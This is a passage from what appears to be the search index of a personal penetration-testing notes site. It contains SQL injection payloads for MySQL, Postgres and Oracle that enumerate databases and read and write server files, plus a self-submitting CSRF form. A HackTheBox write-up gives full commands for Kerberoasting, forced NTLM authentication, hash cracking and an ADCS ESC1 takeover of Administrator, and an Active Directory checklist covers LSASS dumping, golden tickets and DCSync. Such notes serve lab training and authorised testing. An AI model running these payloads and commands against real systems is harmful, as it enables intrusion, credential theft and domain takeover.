LIMIT 1 OFFSET 1)))--\n</code></pre></p> <p>Union Based <pre><code>' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SHOW COLUMNS FROM table_name; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#read-files","title":"Read Files:","text":"<p>Normal <pre><code>SELECT LOAD_FILE('/path/to/file');\n</code></pre> SQLi <pre><code>' UNION SELECT LOAD_FILE('/path/to/file'), NULL --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#write-files","title":"Write Files:","text":"<p>Normal <pre><code>SELECT * INTO OUTFILE '/path/to/file' FROM table_name;\n</code></pre> SQLi <pre><code>' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#postgres","title":"Postgres","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-databases_2","title":"List databases","text":"<p>Normal <pre><code>SELECT datname FROM pg_database;\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT datname, NULL FROM pg_database --\n</code></pre> Stacked Queries <pre><code>; SELECT datname FROM pg_database; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-tables_2","title":"List Tables:","text":"<p>Normal <pre><code>SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --\n</code></pre> Stacked Queries: <pre><code>; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-columns_2","title":"List columns:","text":"<p>Normal <pre><code>SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#read-files_1","title":"Read Files:","text":"<p>Normal <pre><code>SELECT pg_read_file('/path/to/file', 0, 1000000);\n</code></pre> SQLi <pre><code>' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#write-files_1","title":"Write Files:","text":"<p>Normal <pre><code>COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#oracle","title":"ORACLE","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-databases_3","title":"List databases:","text":"<p>Normal <pre><code>SELECT name FROM v$database;\n</code></pre></p> <p>Error based <pre><code>' AND (SELECT COUNT(*) FROM v$database) --\n</code></pre> Union Based <pre><code>' UNION SELECT name, NULL FROM v$database --\n</code></pre> Stacked Queries: <pre><code>; SELECT name FROM v$database; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-tables_3","title":"List Tables:","text":"<p>Normal <pre><code>SELECT table_name FROM all_tables;\n</code></pre> Error based <pre><code>' AND (SELECT COUNT(*) FROM all_tables) --\n</code></pre> Union Based <pre><code>' UNION SELECT table_name, NULL FROM all_tables --\n</code></pre> Stacked Queries: <pre><code>; SELECT table_name FROM all_tables; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-columns_3","title":"List columns:","text":"<p>Normal <pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';\n</code></pre> Error based <pre><code>' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --\n</code></pre> Union Based <pre><code>' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Server-Side%20Template%20Injection%20%28SSTI%29/","title":"Server Side Template Injection (SSTI)","text":"<p>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection 1. First try to generate an error to leak the templating engine 2. Use hacktricks payloads for execution</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20%28CSRF%29/","title":"Cross Site Request Forgery (CSRF)","text":"<ul> <li>Checklist<ul> <li>Does every form have a CSRF token?</li> <li>Can we use GET instead of POST (i.e. can our payload be in the URI instead of the body)<ul> <li>Test the token</li> <li>Test without the token</li> </ul> </li> <li>Test other HTTP methods without the token (e.g. GET)</li> <li>Test without the token value (keep the param name, e.g. &amp;csrf=)</li> <li>Test with a random token</li> <li>Test a previous token</li> <li>Test a token from a different session</li> <li>Test with a token of the same length</li> <li>Test for predictability<ul> <li>Test for static values</li> </ul> </li> <li>Test for known values (e.g. the token is the user-id)</li> <li>Is the token tied to a cookie other than the session cookie?</li> <li>Can the token be stolen with XSS?</li> <li>Is the referer header being used to validate the request origin?<ul> <li>Do the cookies have SameSite set? (Chrome is lax by default)</li> </ul> </li> <li>Can we submit the request with GET?</li> <li>Can we override HTTP methods with <code>X-Http-Method-Override: GET</code><ul> <li>Can we override HTTP methods with <code>_method=POST</code> <pre><code>&lt;!-- original payload generated from BURP Suite Pro --&gt;\n&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"https://&lt;target-site&gt;/api/employees/add\" method=POST&gt;\n      &lt;input type=\"hidden\" name=\"name\" value=\"&lt;payload-info&gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"&lt;payload-info&gt;\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <pre><code>&lt;!-- requires user interaction --&gt;\n&lt;a href=\"http://&lt;target-site&gt;m/api/employees/add?name=&lt;payload-info&gt;\"&gt;Click Me&lt;/a&gt;\n</code></pre> <pre><code>&lt;!-- doesn't require user interaction --&gt;\n&lt;img src=\"http:/&lt;target-site&gt;/api/employees/add?name=&lt;payload-info&gt;\"&gt;\n</code></pre> <pre><code>document.location = 'https://&lt;target-site&gt;/employees/add?name=&lt;payload-info&gt;';\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Request%20Forgery/Server%20Side%20Request%20Forgery/","title":"Server Side Request Forgery","text":"<p>Force the server to make a request to an arbitrary endpoint.</p> <p>Things to assess:</p> <ul> <li>Have a referrer header? Try blind SSRF</li> <li>API interactions where an entire URL is being passed via a controllable input</li> <li>HTTP parameters that are being passed URLs (or sometimes files)</li> </ul> <p>Found an SSRF?</p> <ul> <li>Try requesting localhost</li> <li>Can you make a request to a sensitive endpoint coming from localhost?</li> <li>Fuzz LAN subnets</li> <li>Found alive IP on LAN? <ul> <li>Fuzz for open ports</li> </ul> </li> </ul> <p>Blind SSRF</p> <ul> <li>We find an ssrf but we do not receive a response with data indicating we've hit an endpoint.</li> <li>Data exfil CAN be possible, but it is pretty difficult. </li> <li>Use a tool like burp collaborator OR:<ul> <li>https://github.com/projectdiscovery/interactsh-web</li> </ul> </li> </ul> <p>Misc</p> <ul> <li>Payloads delivered via http request headers may take SSRF to further compromise.<ul> <li>Ex: https://infosecwriteups.com/shellshock-a-deep-dive-into-cve-2014-6271-3eb5b33e5de6 (Shell shock payload delivered via UA)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A4%93%20writeups/","title":"Index","text":"<p>Migrating writeups to new site (in progress)</p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/","title":"OverCertified","text":""},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#network-recon","title":"Network recon","text":"<pre><code>sudo nmap -T4 -A -v -o nmap --min-rate 1000 10.129.229.25 -Pn\n</code></pre> <p>Multi-protocol recon <pre><code>enum4linux-ng -A 10.129.229.25\n</code></pre> </p> <p>We have anonymous LDAP access</p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#ldap-enumeration","title":"LDAP Enumeration","text":"<p>Get users: <pre><code>ldapsearch -x -b \"DC=certified,DC=htb\" -s sub \"(&amp;(objectclass=user))\" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d \" \" &gt; users.txt\n</code></pre> Validate users: <pre><code>kerbrute userenum -d certified.htb --dc 10.129.229.25 users.txt\n</code></pre>  All users but guest are valid + all users require preauth for tickets requests.  Getting users descriptions <pre><code>nxc ldap 10.129.229.25 -u '' -p '' -M get-desc-users\n</code></pre> We get a password </p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#lateral-movement-to-mssqlserver","title":"Lateral Movement to MSSQLSERVER","text":"<p>Lets check for users with SPNs set <pre><code>ldapsearch -x -b \"DC=certified,DC=htb\" -s sub \"(&amp;(objectClass=user)(servicePrincipalName=*))\" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d \" \"\n</code></pre>  user is kerberoastable!  <pre><code>impacket-GetUserSPNs -dc-ip 10.129.229.25 certified.htb/ldapusr:'ldapisfun' -request-user MSSQLSERVER\n</code></pre>  Try to crack the hash <pre><code>hashcat -m 13100 mssqlserver.hash /usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>MSSQLSERVER:lucky7\n</code></pre></p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#mssql-enumeration","title":"MSSQL Enumeration","text":"<p><pre><code>nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -q 'SELECT name FROM master.dbo.sysdatabases;'\n</code></pre> <pre><code>impacket-mssqlclient MSSQLSERVER:'lucky7'@10.129.229.25 -windows-auth\n</code></pre></p> <p>We enumerate stored procedures and tables, we find out we can't run <code>xp_cmdshell</code> to get RCE. We can run <code>xp_dirtree</code> for force auth. Start responder: <pre><code>sudo responder -I tun0\n</code></pre> Trigger auth: <pre><code>xp_dirtree \\\\10.10.14.4\\test\n</code></pre>  Lets try to crack the NTLMv2 hash <pre><code>hashcat -m 5600 thomas.hash /usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>thomas:159357\n</code></pre> we have access with winrm <pre><code>nxc winrm 10.129.229.25 -u thomas -p '159357'\n</code></pre> <pre><code>evil-winrm -i 10.129.229.25 -u thomas -p '159357'\n</code></pre> after grabbing the user flag and poking around, i decided to run bloodhound <pre><code>sudo bloodhound-ce-python -u 'thomas' -p '159357' -ns 10.129.229.25 -d certified.htb -c all\n</code></pre>  We see <code>thomas</code> has inherited access to the <code>CERTIFICATE SERVICE DCOM ACCESS</code> group. This makes me think the priv esc is an ADCS misconfiguration </p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#administrator","title":"Administrator","text":"<p>Use certipy to find vulnerable templates <pre><code>certipy-ad find -vulnerable -u thomas -p '159357' -dc-ip 10.129.229.25\n</code></pre>  We see this template is vulnerable to ESC1  Lets collect what we need for ESC1: Template name, CA, target domain. </p> <p>we can build our pfx request targeting the administrator user <pre><code>certipy-ad req -u thomas -p '159357' -dc-ip 10.129.229.25 -template Auth -upn Administrator@certified.htb -ca CERTIFIED-CA -target certified.certified.htb\n</code></pre>  We can either use the pfx directly with nxc: <pre><code>nxc smb 10.129.229.25 --pfx-cert administrator.pfx -u 'Administrator'\n</code></pre>  OR use <code>certipy auth</code> to get a TGS and NTLM hash <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.25\n</code></pre>  and use that to auth.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/","title":"Active Directory","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#i-reconnaissance-enumeration-pre-compromise","title":"I. Reconnaissance &amp; Enumeration (Pre-Compromise)","text":"<ul> <li>External Reconnaissance:<ul> <li>Identify domain names and subdomains (OSINT, DNSdumpster, Sublist3r)</li> <li>Gather employee names and email addresses (OSINT, Hunter.io, theHarvester)</li> <li>Identify publicly exposed services (Nmap, Shodan)</li> <li>Search for leaked credentials (Have I Been Pwned, DeHashed)</li> </ul> </li> <li>Internal Network Mapping (Assuming Initial Access to a Network Point):<ul> <li>Identify live hosts (Nmap, Ping, ARP scans)</li> <li>Port scan identified hosts (Nmap, Masscan)</li> <li>Identify running services and versions (Nmap -sV)</li> </ul> </li> <li>LDAP Enumeration (Anonymous or Authenticated):<ul> <li>Identify Domain Controllers (nltest /dclist:, Nmap LDAP scripts, ADExplorer)</li> <li>Enumerate domain information (ldapsearch, ADExplorer, PowerView)</li> <li>Enumerate users (ldapsearch, PowerView Get-NetUser)</li> <li>Enumerate groups (ldapsearch, PowerView Get-NetGroup)</li> <li>Enumerate computers (ldapsearch, PowerView Get-NetComputer)</li> <li>Enumerate OUs (ldapsearch, ADExplorer)</li> <li>Enumerate Group Policies (PowerView Get-NetGPO)</li> <li>Enumerate ACLs on objects (PowerView Get-ObjectAcl, dsacls)</li> <li>Identify domain trusts (nltest /domain_trusts, PowerView Get-NetDomainTrust)</li> <li>Identify sites and subnets (nltest /siteget, PowerView Get-NetSite)</li> <li>Check for LDAP signing (Nmap ldap-security script, LdapRelayScan)</li> </ul> </li> <li>SMB Enumeration:<ul> <li>List shares (Nmap smb-enum-shares, CrackMapExec, smbclient)</li> <li>Check for NULL sessions (rpcclient -U \"\" -N, enum4linux)</li> <li>Enumerate users via SAMR (enum4linux, CrackMapExec --rid-brute)</li> <li>Enumerate domain policies (enum4linux)</li> </ul> </li> <li>DNS Enumeration:<ul> <li>Identify internal DNS servers</li> <li>Attempt zone transfers (dig axfr, nslookup ls -d)</li> <li>Enumerate DNS records (dnsrecon, Nmap dns-brute)</li> <li>Check for ADIDNS stale records (ADIDNSDump)</li> </ul> </li> <li>RPC/MSRPC Enumeration:<ul> <li>Enumerate RPC endpoints (rpcdump.py)</li> <li>Gather information via specific MSRPC interfaces</li> </ul> </li> <li>Kerberos Enumeration:<ul> <li>Identify KDC (Key Distribution Center)</li> <li>User enumeration via Kerberos (Kerbrute userenum, nmap script krb5-enum-users)</li> </ul> </li> <li>NTP Enumeration:<ul> <li>Identify NTP servers (ntpq -p, nmap ntp-info)</li> </ul> </li> <li>BloodHound Data Collection:<ul> <li>Run SharpHound collector (BloodHound GUI, PowerShell ingestor)</li> <li>Analyze data for attack paths (BloodHound GUI)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#ii-initial-compromise","title":"II. Initial Compromise","text":"<ul> <li>Password Spraying:<ul> <li>Target common usernames with weak/common passwords (CrackMapExec, MSF auxiliary/scanner/smb/smb_login)</li> </ul> </li> <li>AS-REP Roasting:<ul> <li>Identify users with \"Do not require Kerberos preauthentication\" set (PowerView Get-DomainUser -PreauthNotRequired, Rubeus asreproast)</li> <li>Crack AS-REP hashes (Hashcat, John the Ripper)</li> </ul> </li> <li>LLMNR/NBT-NS/mDNS Poisoning:<ul> <li>Listen for and spoof name resolution requests (Responder, Inveigh)</li> <li>Relay captured hashes (ntlmrelayx.py) or crack them (Hashcat, John the Ripper)</li> </ul> </li> <li>SMB Relay Attacks:<ul> <li>Relay SMB authentication to other machines (ntlmrelayx.py)</li> <li>Target machines with SMB signing disabled (Responder, nmap smb-security-mode)</li> </ul> </li> <li>Printer Spooler (PrintNightmare &amp; variants - CVE-2021-34527, CVE-2021-1675):<ul> <li>Check for vulnerable spooler service (Rpcclient, various exploit scripts)</li> </ul> </li> <li>PetitPotam (MS-EFSRPC):<ul> <li>Coerce machine account authentication (PetitPotam.py)</li> <li>Combine with AD CS for NTLM relay (if applicable)</li> </ul> </li> <li>Exploiting Known Vulnerabilities:<ul> <li>Scan for unpatched systems (Nessus, OpenVAS, Nmap NSE scripts)</li> <li>Target specific CVEs (e.g., Zerologon - CVE-2020-1472, MS17-010 EternalBlue)</li> </ul> </li> <li>Phishing/Spear Phishing:<ul> <li>Deliver malicious payloads (executables, documents with macros, links)</li> </ul> </li> <li>Web Application Vulnerabilities (on domain-joined servers):<ul> <li>Test for common web vulns (SQLi, XSS, RCE)</li> </ul> </li> <li>Default/Weak Credentials in Services:<ul> <li>Check common services (Tomcat, JBoss, Jenkins, etc.)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#iii-credential-dumping-hash-cracking","title":"III. Credential Dumping &amp; Hash Cracking","text":"<ul> <li>LSASS Dumping:<ul> <li>Mimikatz (sekurlsa::logonpasswords, sekurlsa::msv, sekurlsa::tspkg, sekurlsa::wdigest)</li> <li>ProcDump (procdump -ma lsass.exe lsass.dmp)</li> <li>Task Manager (right-click lsass.exe -&gt; Create dump file)</li> <li>comsvcs.dll MiniDump (rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump &lt;LSASS_PID&gt; C:\\temp\\lsass.dmp full)</li> </ul> </li> <li>SAM/SYSTEM Hive Extraction (Offline):<ul> <li>Extract from Volume Shadow Copies</li> <li>Extract from backups</li> <li>Use tools like secretsdump.py, pwdump</li> </ul> </li> <li>NTDS.dit Extraction (Domain Controller):<ul> <li>Use ntdsutil.exe (ifm - create full)</li> <li>Volume Shadow Copy methods (vssadmin, diskshadow)</li> <li>secretsdump.py (remote extraction)</li> <li>Parse with tools like Impacket's secretsdump.py, Quarks PwDump</li> </ul> </li> <li>LSA Secrets:<ul> <li>Mimikatz (lsadump::secrets)</li> <li>secretsdump.py</li> </ul> </li> <li>DPAPI (Data Protection API):<ul> <li>Extract DPAPI master keys (Mimikatz dpapi::masterkey)</li> <li>Decrypt DPAPI protected secrets (SharpDPAPI, DonPAPI)</li> </ul> </li> <li>Browser Passwords/Cookies:<ul> <li>LaZagne, SharpWeb, BrowseHistoryView</li> </ul> </li> <li>Credentials in Files/Registry:<ul> <li>GPP Passwords (SYSVOL group.xml files - PowerSploit Get-GPPPassword, SharpGPOAbuse)</li> <li>Unattend.xml files</li> <li>Web.config files</li> <li>PowerShell transcripts</li> <li>Registry (e.g., WinSCP, VNC passwords)</li> </ul> </li> <li>Wireless Network Keys:<ul> <li><code>netsh wlan show profiles key=clear</code></li> </ul> </li> <li>Hash Cracking:<ul> <li>Tools: Hashcat, John the Ripper</li> <li>Target: NTLM, NTLMv2, Kerberos tickets, LM</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#iv-local-privilege-escalation-windows","title":"IV. Local Privilege Escalation (Windows)","text":"<ul> <li>Kernel Exploits:<ul> <li>Check OS version and patch level (systeminfo)</li> <li>Search for known exploits (Sherlock, Watson, Windows Exploit Suggester)</li> </ul> </li> <li>Insecure Service Permissions:<ul> <li>Writable service binaries (accesschk.exe, PowerUp Get-ModifiableServiceFile)</li> <li>Modifiable service configuration (accesschk.exe, PowerUp Get-ModifiableService)</li> <li>Unquoted Service Paths (PowerUp Get-UnquotedService, <code>wmic service get name,pathname,startname | findstr /i \"program files\" | findstr /i /v \"\"\"</code>)</li> </ul> </li> <li>DLL Hijacking:<ul> <li>Identify missing DLLs loaded by privileged processes (ProcMon)</li> <li>Check for writable directories in PATH</li> </ul> </li> <li>AlwaysInstallElevated:<ul> <li>Check registry keys: <code>HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code> and <code>HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code> (reg query)</li> </ul> </li> <li>Scheduled Tasks:<ul> <li>Writable task files/actions (accesschk.exe, schtasks /query /v /fo LIST)</li> <li>Tasks running as SYSTEM with modifiable binaries</li> </ul> </li> <li>Startup Applications:<ul> <li>Writable startup application paths/binaries (accesschk.exe)</li> </ul> </li> <li>Registry Misconfigurations:<ul> <li>Autoruns keys (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, etc.) - check permissions (accesschk.exe)</li> <li>Weak permissions on <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code> keys</li> </ul> </li> <li>Credential Manager / Stored Credentials:<ul> <li>cmdkey /list</li> <li>Mimikatz (vault::cred, token::elevate then vault::cred)</li> </ul> </li> <li>Token Impersonation/Theft:<ul> <li>Incognito (MSF Meterpreter), Mimikatz (token::*)</li> <li>Identify privileged tokens (Get-Process -IncludeUserName | Select-Object -ExpandProperty UserName)</li> </ul> </li> <li>Potato Attacks (SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege):<ul> <li>RottenPotato, JuicyPotato, SweetPotato, GenericPotato (check for required privileges: <code>whoami /priv</code>)</li> </ul> </li> <li>Password Mining from Memory/Files (already covered in Credential Dumping):<ul> <li>Look for passwords in configuration files, scripts, memory dumps</li> </ul> </li> <li>Group Policy Preferences (GPP) Passwords (local):<ul> <li>If GPP files were cached locally with cpassword</li> </ul> </li> <li>Named Pipe Impersonation:<ul> <li>Exploit vulnerable named pipe servers</li> </ul> </li> <li>Abusing Privileges:<ul> <li>SeBackupPrivilege (robocopy /B, diskshadow, SharpBackup)</li> <li>SeRestorePrivilege</li> <li>SeTakeOwnershipPrivilege (takeown.exe)</li> <li>SeDebugPrivilege (already heavily used by tools like Mimikatz)</li> <li>SeLoadDriverPrivilege (Capcom.sys exploit, KDU)</li> <li>SeCreateTokenPrivilege</li> <li>SeTcbPrivilege</li> </ul> </li> <li>Hot Potato/Rotten Potato NG/PrintSpoofer:<ul> <li>When specific privileges (SeImpersonate, SeAssignPrimaryToken) are available.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#v-lateral-movement","title":"V. Lateral Movement","text":"<ul> <li>Pass-the-Hash (PtH):<ul> <li>Use NTLM hashes to authenticate (Mimikatz sekurlsa::pth, CrackMapExec, Impacket's psexec.py/smbexec.py/wmiexec.py with -hashes)</li> </ul> </li> <li>Pass-the-Ticket (PtT):<ul> <li>Use Kerberos tickets (TGTs, TGSs) to authenticate (Mimikatz kerberos::ptt, Rubeus ptt)</li> <li>Requires LSASS access or exported tickets</li> </ul> </li> <li>Over-Pass-the-Hash (OPtH) / Pass-the-Key:<ul> <li>Use AES keys (from Kerberos) instead of NTLM hashes (Mimikatz sekurlsa::pth /kdc, Rubeus asktgs /aeskey)</li> </ul> </li> <li>SMB/PsExec:<ul> <li>Execute commands remotely (psexec.exe, CrackMapExec, Impacket's psexec.py, smbexec.py)</li> </ul> </li> <li>Windows Management Instrumentation (WMI):<ul> <li>Execute commands remotely (wmic.exe, CrackMapExec, Impacket's wmiexec.py, PowerSploit Invoke-WmiCommand)</li> </ul> </li> <li>WinRM / PowerShell Remoting:<ul> <li>Execute PowerShell commands remotely (Enter-PSSession, Invoke-Command)</li> <li>Check if WinRM is enabled (Test-WSMan)</li> </ul> </li> <li>Remote Desktop Protocol (RDP):<ul> <li>Connect with valid credentials (mstsc.exe, rdesktop, xfreerdp)</li> <li>RDP session hijacking (tscon)</li> </ul> </li> <li>Scheduled Tasks (Remote):<ul> <li>Create/modify tasks on remote systems (schtasks /s &lt;target&gt; /create, Invoke-ATHRemote)</li> </ul> </li> <li>DCOM Objects:<ul> <li>Utilize DCOM applications for remote execution (e.g., MMC20.Application, ShellBrowserWindow)</li> </ul> </li> <li>Exploiting Trust Relationships:<ul> <li>Move between domains/forests via trust keys (inter-realm TGT, Mimikatz lsadump::trust /patch)</li> </ul> </li> <li>Resource-Based Constrained Delegation (RBCD):<ul> <li>If you compromise an account/computer that has <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on a target computer.</li> <li>Forge S4U2self/S4U2proxy tickets (Rubeus s4u)</li> </ul> </li> <li>Distributed File System (DFS):<ul> <li>Identify DFS shares and target linked servers.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#vi-domain-dominance-persistence","title":"VI. Domain Dominance &amp; Persistence","text":"<ul> <li>Golden Ticket Attack:<ul> <li>Forge a Kerberos TGT for any user with any privileges (Mimikatz kerberos::golden)</li> <li>Requires krbtgt account NTLM hash/AES key</li> </ul> </li> <li>Silver Ticket Attack:<ul> <li>Forge a Kerberos TGS for a specific service on a specific server (Mimikatz kerberos::golden /service /server /user /id (SPN's RID))</li> <li>Requires service account NTLM hash/AES key (e.g., CIFS, HOST, RPCSS)</li> </ul> </li> <li>Skeleton Key:<ul> <li>Patch LSASS on DCs to allow a master password for all users (Mimikatz misc::skeleton)</li> <li>Requires DA privileges and LSASS access on DC</li> </ul> </li> <li>DSRM (Directory Services Restore Mode) Password Synchronization:<ul> <li>Synchronize DSRM password with a domain admin account for backdoor access (Mimikatz lsadump::setntlm)</li> </ul> </li> <li>AdminSDHolder:<ul> <li>Modify AdminSDHolder object permissions to grant persistence to protected groups (PowerView Set-ObjectACL)</li> </ul> </li> <li>Domain Controller Synchronization Rights (DCsync):<ul> <li>Grant an account the rights to replicate directory changes (Mimikatz lsadump::dcsync)</li> <li>Requires \"Replicating Directory Changes\" and \"Replicating Directory Changes All\" permissions</li> </ul> </li> <li>SID History:<ul> <li>Add a known SID (e.g., Domain Admins SID) to an account's SID history (Mimikatz sid::patch)</li> </ul> </li> <li>Group Policy Abuse:<ul> <li>Modify GPOs to deploy software, run scripts, change local admin groups (Group Policy Management Console, SharpGPOAbuse)</li> </ul> </li> <li>Scheduled Tasks on DCs:<ul> <li>Create persistent tasks on Domain Controllers</li> </ul> </li> <li>Service Creation on DCs:<ul> <li>Create persistent services on Domain Controllers (sc.exe create)</li> </ul> </li> <li>Active Directory Certificate Services (AD CS) Abuse:<ul> <li>ESC1-ESC8 vulnerabilities (Certify, Certipy)</li> <li>Forge certificates for authentication (Rubeus ask /certificate)</li> </ul> </li> <li>Shadow Credentials (msDS-KeyCredentialLink):<ul> <li>Add a key credential to a target object (e.g., computer account) to authenticate as it (Whisker, NTLMRelayToADCS + ShadowCoerce)</li> </ul> </li> <li>DPAPI Domain Backup Keys:<ul> <li>Extract DPAPI domain backup keys from a DC to decrypt user DPAPI blobs (Mimikatz lsadump::backupkeys)</li> </ul> </li> <li>Modifying SACLs/ACLs:<ul> <li>Modify System Access Control Lists or ACLs on critical objects for stealth or re-entry.</li> </ul> </li> <li>DNS Admin Privileges:<ul> <li>If a user is part of DnsAdmins group, can load arbitrary DLL into DNS service running as SYSTEM (dnscmd.exe /config /serverlevelplugindll)</li> </ul> </li> <li>Backdooring LAPS:<ul> <li>If LAPS is used, gain permissions to read LAPS passwords.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#vii-specific-kerberos-attacks","title":"VII. Specific Kerberos Attacks","text":"<ul> <li>Kerberoasting:<ul> <li>Request TGS for service accounts (GetUserSPNs.py, PowerView Get-NetUser -SPN | Get-KerberoastableUser, Rubeus kerberoast)</li> <li>Crack service account hashes offline (Hashcat, John the Ripper)</li> </ul> </li> <li>AS-REP Roasting (already listed):<ul> <li>Target users without Kerberos pre-authentication</li> </ul> </li> <li>Unconstrained Delegation:<ul> <li>Identify hosts with unconstrained delegation (PowerView Get-NetComputer -Unconstrained, BloodHound)</li> <li>Coerce authentication to these hosts (PrinterBug, PetitPotam) to capture TGTs of users authenticating to them (Mimikatz on the unconstrained host)</li> </ul> </li> <li>Constrained Delegation (Traditional &amp; RBCD):<ul> <li>Identify accounts/computers configured for constrained delegation (PowerView, BloodHound)</li> <li>If S4U2Self is enabled, can impersonate users to services the account is delegated to (Rubeus s4u)</li> <li>For RBCD, see Lateral Movement section.</li> </ul> </li> <li>\"NoPAC\" / SAM Account Name Spoofing (CVE-2021-42278 &amp; CVE-2021-42287):<ul> <li>Combine machine account rename with KDC SPN processing flaw for privilege escalation (exploit scripts available)</li> </ul> </li> <li>Diamond Ticket (Modifying TGT):<ul> <li>Modify an existing TGT (e.g., change user ID, groups) if krbtgt key is known (requires specialized tools beyond standard Mimikatz golden ticket command, conceptually related).</li> </ul> </li> <li>Sapphire Ticket (Pass-the-Cache with PAC modification):<ul> <li>Injecting a PAC from one user into another's TGT/TGS.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#viii-forest-trust-attacks","title":"VIII. Forest &amp; Trust Attacks","text":"<ul> <li>Trust Ticket Abuse:<ul> <li>Forge inter-realm TGTs if trust keys are compromised (Mimikatz lsadump::trust /patch, then kerberos::golden for cross-trust)</li> </ul> </li> <li>SID History on Trust Accounts:<ul> <li>Exploit SID history on forest trust accounts.</li> </ul> </li> <li>Exploiting Weak Trust Configurations:<ul> <li>Identify trusts with weak security settings 